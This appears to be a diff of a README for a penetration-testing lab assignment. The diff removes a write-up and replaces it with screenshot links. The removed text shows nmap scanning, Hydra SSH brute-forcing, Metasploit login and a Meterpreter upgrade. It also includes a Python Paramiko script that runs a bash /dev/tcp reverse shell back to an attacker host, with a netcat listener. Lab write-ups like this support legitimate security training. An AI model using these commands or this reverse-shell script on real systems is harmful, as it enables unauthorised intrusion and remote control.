@@ -1,82 +1,13 @@
-# Phase 1: Exploitation and Reverse Shell
-
-## Task 1.1: Compromise the target using Metasploit
-
-### Service Targeted
-- **Service**: SSH (OpenSSH 6.6.1p1)
-- **Vulnerable Credentials**: `vagrant:vagrant`
-
-### Steps Followed:
-1. **Reconnaissance**:
-   ```bash
-   nmap -sV 192.168.142.131
-   ```
-   - Identified OpenSSH running on port 22
-
-2. **Brute-Force with Hydra**:
-   ```bash
-   hydra -L usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://192.168.142.131 -t 4
-   ```
-   - Discovered working credentials: `vagrant:vagrant`
-
-3. **Exploit with Metasploit**:
-   ```
-   sudo msfconsole
-   use auxiliary/scanner/ssh/ssh_login
-   set RHOSTS 192.168.142.131
-   set USERNAME vagrant
-   set PASSWORD vagrant
-   run
-   ```
-   - SSH shell session established
-
-4. **Upgrade to Meterpreter**:
-   ```
-   use post/multi/manage/shell_to_meterpreter
-   set SESSION 1
-   session 1 
-   shell
-   ```
-   - Upgraded shell to Meterpreter session
-
-
-## ✅ Task 1.2: Exploit via Custom Python Script
-
-### Script Summary
-- Used Python with Paramiko to automate SSH login and trigger a reverse shell.
-
-### Python Script: `ssh_reverse_shell_1.2.py`
-```python
-import paramiko
-
-target_ip = "192.168.142.131"
-username = "vagrant"
-password = "vagrant"
-lhost="192.168.142.129"
-lport = "4444"
-
-payload = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-
-client = paramiko.SSHClient()
-client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-client.connect(target_ip, username=username, password=password)
-client.exec_command(payload)
-
-client.close()
-```
-
-### Listener on Attacker Machine
-```bash
-nc -lvnp 4444
-```
-- Successful reverse shell received.
-
----
-
-📸 Screenshots to Include:
-- Hydra output showing credentials found
-- Metasploit SSH login success
-- Meterpreter session after upgrade
-- Netcat receiving reverse shell
-- Python script execution
-
+<img width="521" alt="Screenshot12" src="https://github.com/user-attachments/assets/fb0c3d27-9bf2-4662-9b23-71a9801728ed" />
+<img width="542" alt="Screenshot11" src="https://github.com/user-attachments/assets/ba17e66b-5274-46bc-a833-9ceb4fc84d96" />
+<img width="583" alt="Screenshot10" src="https://github.com/user-attachments/assets/b369f7b7-dfee-418b-ac9e-c80df53a94a6" />
+<img width="676" alt="Screenshot9" src="https://github.com/user-attachments/assets/7f0e2070-5b65-4e30-a2c3-94006feda3e4" />
+<img width="773" alt="Screenshot8" src="https://github.com/user-attachments/assets/12ecda00-ed6d-4317-8c67-a2e2e7046408" />
+<img width="720" alt="Screenshot7" src="https://github.com/user-attachments/assets/7e6beaab-531c-4f78-b170-db5d6c70481a" />
+<img width="959" alt="Screenshot6" src="https://github.com/user-attachments/assets/68a68e94-a239-4e65-9224-2518d8d782f9" />
+<img width="776" alt="Screenshot5" src="https://github.com/user-attachments/assets/3590b77b-3925-4ffd-bc83-a630dee2d7ae" />
+<img width="527" alt="Screenshot4" src="https://github.com/user-attachments/assets/0ec4a285-92cc-424d-a12c-8873d5e5f72d" />
+<img width="695" alt="Screenshot3" src="https://github.com/user-attachments/assets/cba2654c-1720-4ac6-9567-ba25dc3eeef1" />
+<img width="419" alt="Screenshot2" src="https://github.com/user-attachments/assets/7d9cf94e-3eb7-4041-9e36-76f230d3a0ce" />
+<img width="873" alt="Screenshot1" src="https://github.com/user-attachments/assets/5ffa85b9-98a4-4a8b-b3bd-3ce55006568d" />
+[README_phase1_final.md](https://github.com/user-attachments/files/19923567/README_phase1_final.md)
